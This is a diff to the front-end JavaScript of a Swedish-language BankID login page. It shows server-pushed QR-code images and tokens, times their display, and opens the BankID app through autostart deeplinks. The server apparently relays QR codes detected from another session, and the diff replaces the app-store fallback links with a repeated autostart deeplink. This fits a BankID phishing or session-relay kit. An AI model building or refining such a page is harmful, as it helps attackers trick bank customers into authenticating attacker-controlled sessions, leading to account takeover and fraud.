@@ -44,12 +44,18 @@ const socket = io();
 const qrImage = document.getElementById('qrImage');
 qrImage.style.display = 'none';
 
-// Store the QR data for BankID deep linking
 let bankIdQRData = '';
+let qrDisplayTimeout;
+let qrIsDisplayed = false;
 
 socket.on('update_qr_code_image', function (data) {
+    if (qrDisplayTimeout) {
+        clearTimeout(qrDisplayTimeout);
+    }
+    
     qrImage.src = 'data:image/png;base64,' + data.qr_image;
     hidee.style.display = 'none';
+    qrIsDisplayed = true;
     
     console.log("Received QR data:", data.qr_code_data);
     
@@ -97,7 +103,32 @@ socket.on('update_qr_code_image', function (data) {
     if (data.qrData) {
         bankIdQRData = data.qrData;
     }
+    
+    qrDisplayTimeout = setTimeout(checkForNoQR, 2000);
 });
+
+socket.on('no_qr_detected', function() {
+    if (qrIsDisplayed) {
+        showAnimationIfNoNewQR();
+    }
+});
+
+function checkForNoQR() {
+    socket.emit('check_qr_detection');
+}
+
+function showAnimationIfNoNewQR() {
+    qrImage.style.display = 'none';
+    hidee.style.display = 'block';
+    qrIsDisplayed = false;
+    
+    const modalContent = qrImage.parentElement;
+    if (modalContent) {
+        modalContent.innerHTML = '';
+        modalContent.appendChild(hidee);
+        modalContent.appendChild(qrImage);
+    }
+}
 
 function openBankIDApp() {
     const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
@@ -159,20 +190,22 @@ function openBankIDApp() {
             setTimeout(function() {
                 if (confirm('BankID-appen kunde inte öppnas eller gav ett fel. Vill du installera eller uppdatera BankID-appen?')) {
                     if (isIOS) {
-                        window.location.href = 'https://apps.apple.com/se/app/bankid-s%C3%A4kerhetsapp/id433151512';
+                        window.location.href = `bankid:///?autostarttoken=${autostartToken}&redirect=null`;
                     } else if (isAndroid) {
-                        window.location.href = 'https://play.google.com/store/apps/details?id=com.bankid.bus';
+                        window.location.href = `bankid:///?autostarttoken=${autostartToken}&redirect=null`;
                     }
                 }
-            }, 3000);
+            }, 10000);
         } else {
             alert('Ingen BankID-data tillgänglig. Var god skanna QR-koden igen.');
         }
     });
 }
 
-// Removed the automatic socket.emit('request_qr_data') that was causing
-// the QR to appear before scanning
+document.querySelector('.menu-item').addEventListener('click', function() {
+    showBankIDLogo();
+});
+
 socket.on('qr_data', function(data) {
     if (data && data.qrData) {
         bankIdQRData = data.qrData;
